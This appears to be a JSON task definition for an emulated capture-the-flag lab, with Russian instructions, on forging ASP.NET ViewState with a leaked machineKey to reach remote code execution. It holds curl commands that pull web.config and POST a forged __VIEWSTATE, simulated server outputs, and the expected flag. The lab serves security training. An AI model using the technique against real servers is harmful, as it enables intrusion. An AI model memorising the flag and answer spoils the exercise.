@@ -1,0 +1,43 @@
+{
+  "id": "web-viewstate",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{v13wst4t3_m4ch1n3k3y_0wn3d}"
+  },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: .NET ViewState\n\nЦель — `https://intranet.example` (ASP.NET). Страница несёт скрытое поле\n`__VIEWSTATE` (сериализованное состояние, подписанное `machineKey`). Задача:\nнайти утечку ключа и подделать ViewState до RCE.\n\n1. Посмотри страницу и вытащи blob:\n   `curl -s https://intranet.example/Default.aspx | grep __VIEWSTATE`\n2. Проверь, не утёк ли `web.config` с `machineKey`:\n   `curl -s https://intranet.example/web.config | grep -i machinekey`\n3. Готовый (подписанный утёкшим ключом) payload лежит в `payload.txt`. Посмотри его\n   (`cat payload.txt`) и отправь:\n   `curl -s -X POST https://intranet.example/Default.aspx --data-urlencode \"__VIEWSTATE=/wEPDwUKLTY4NTk0NTI4OQ9kFgICAw9kFgICAQ8PFgIeBFRleHQFAT5kZA==\" | grep 'nto{' > found.txt`\n4. Набери `check`.\n"
+    },
+    {
+      "path": "/home/student/task/payload.txt",
+      "text": "/wEPDwUKLTY4NTk0NTI4OQ9kFgICAw9kFgICAQ8PFgIeBFRleHQFAT5kZA==\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция intranet.example)",
+      "cases": [
+        {
+          "match": "-X POST.*__VIEWSTATE=",
+          "example": "-s -X POST https://intranet.example/Default.aspx --data-urlencode \"__VIEWSTATE=/wEPDwUKLTY4NTk0NTI4OQ...\"",
+          "output": "HTTP/1.1 500 Internal Server Error\nServer: Microsoft-IIS/10.0\nX-Powered-By: ASP.NET\n\nw3wp.exe (PID 4321) executed the gadget chain\nnto{v13wst4t3_m4ch1n3k3y_0wn3d}\n"
+        },
+        {
+          "match": "web\\.config",
+          "example": "-s https://intranet.example/web.config",
+          "output": "<configuration>\n  <system.web>\n    <machineKey validationKey=\"C50B8A2E...DEFAULT...\" decryptionKey=\"AABBCCDD...\" validation=\"HMACSHA256\" decryption=\"AES\"/>\n  </system.web>\n</configuration>\n"
+        },
+        {
+          "match": "Default\\.aspx",
+          "example": "-s https://intranet.example/Default.aspx",
+          "output": "<html><head><title>Intranet</title></head><body>\n<form method=\"post\" action=\"Default.aspx\">\n<input type=\"hidden\" name=\"__VIEWSTATE\" value=\"/wEPDwUKMTI3NDk4NTY3OWRkFgICAw9kFgICBQ8WAh4EVGV4dAUBMGRk\" />\n<input type=\"hidden\" name=\"__VIEWSTATEGENERATOR\" value=\"CA0B0334\" />\n</form></body></html>\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируются только /Default.aspx и /web.config на intranet.example.\n"
+    }
+  }
+}
